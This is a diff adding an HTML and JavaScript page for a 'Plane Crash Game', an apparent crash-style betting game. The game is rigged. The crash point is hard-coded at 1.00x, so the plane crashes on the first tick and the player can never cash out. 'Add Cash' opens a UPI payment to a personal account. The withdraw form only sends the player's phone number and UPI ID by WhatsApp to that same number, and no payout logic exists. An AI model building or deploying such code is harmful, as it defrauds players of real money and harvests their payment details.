@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>✈️ Plane Crash Game</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      text-align: center;
+    }
+
+    #game-box {
+      position: relative;
+      width: 300px;
+      height: 500px;
+      margin: 20px auto;
+      background: linear-gradient(to top, #222, #4faaff);
+      border: 3px solid #fff;
+      border-radius: 10px;
+      overflow: hidden;
+    }
+
+    #plane {
+      width: 80px;
+      position: absolute;
+      left: 50%;
+      transform: translateX(-50%);
+      bottom: 0;
+    }
+
+    #multiplier {
+      font-size: 36px;
+      margin: 20px;
+      color: yellow;
+    }
+
+    button {
+      margin: 8px;
+      padding: 10px 20px;
+      font-size: 16px;
+      border-radius: 6px;
+      border: none;
+      cursor: pointer;
+    }
+
+    #withdraw-form {
+      display: none;
+      background: #111;
+      padding: 20px;
+      margin-top: 20px;
+      border-radius: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>✈️ Plane Crash Game</h1>
+  
+  <div id="game-box">
+    <img id="plane" src="https://cdn-icons-png.flaticon.com/512/684/684908.png" alt="plane">
+  </div>
+
+  <div id="multiplier">1.00x</div>
+
+  <button onclick="startGame()">🚀 Start</button>
+  <button onclick="cashOut()">💰 Cash Out</button>
+  <button onclick="addCash()">➕ Add Cash (₹10)</button>
+  <button onclick="showWithdrawForm()">Withdraw</button>
+
+  <div id="result"></div>
+
+  <div id="withdraw-form">
+    <h3>Withdraw Request</h3>
+    <input type="text" id="phone" placeholder="Your Phone Number"><br><br>
+    <input type="text" id="upi" placeholder="Your UPI ID"><br><br>
+    <input type="number" id="amount" placeholder="Withdraw Amount ₹"><br><br>
+    <button onclick="submitWithdraw()">Send Request</button>
+  </div>
+
+  <script>
+    let multiplier = 1.0;
+    let interval;
+    let crashed = false;
+    const plane = document.getElementById('plane');
+    const multiplierText = document.getElementById('multiplier');
+    let planePosition = 0;
+
+    function startGame() {
+      multiplier = 1.0;
+      crashed = false;
+      planePosition = 0;
+      document.getElementById("result").innerText = "";
+      plane.style.bottom = "0px";
+      multiplierText.innerText = "1.00x";
+      clearInterval(interval);
+
+      const crashAt = 1.0; // Still crashes at 1.00x (change if needed)
+
+      interval = setInterval(() => {
+        multiplier += 0.25; // 🔥 FAST SPEED (earlier 0.1)
+        multiplierText.innerText = multiplier.toFixed(2) + "x";
+        planePosition += 15; // Plane also moves faster
+        plane.style.bottom = planePosition + "px";
+
+        if (multiplier >= crashAt) {
+          clearInterval(interval);
+          crashed = true;
+          document.getElementById("result").innerText = "💥 Crashed at " + multiplier.toFixed(2) + "x";
+        }
+      }, 150); // 🔥 FAST UPDATE (earlier 300ms)
+    }
+
+    function cashOut() {
+      if (!crashed) {
+        clearInterval(interval);
+        document.getElementById("result").innerText =
+          "✅ Cashed out at " + multiplier.toFixed(2) + "x! You won ₹" + (multiplier * 10).toFixed(0);
+      } else {
+        document.getElementById("result").innerText = "❌ Too Late! Plane crashed.";
+      }
+    }
+
+    function addCash() {
+      window.open("upi://pay?pa=9718910662@fam&pn=Ishu%20Pal&cu=INR&am=10", "_blank");
+    }
+
+    function showWithdrawForm() {
+      document.getElementById("withdraw-form").style.display = "block";
+    }
+
+    function submitWithdraw() {
+      const phone = document.getElementById('phone').value;
+      const upi = document.getElementById('upi').value;
+      const amount = document.getElementById('amount').value;
+
+      if (!phone || !upi || !amount) {
+        alert("Please fill all fields.");
+        return;
+      }
+
+      const message = `📤 Withdraw Request\nPhone: ${phone}\nUPI: ${upi}\nAmount: ₹${amount}`;
+      window.open(`https://wa.me/919718910662?text=${encodeURIComponent(message)}`, "_blank");
+      alert("Withdraw Request Sent via WhatsApp");
+    }
+  </script>
+
+</body>
+</html>
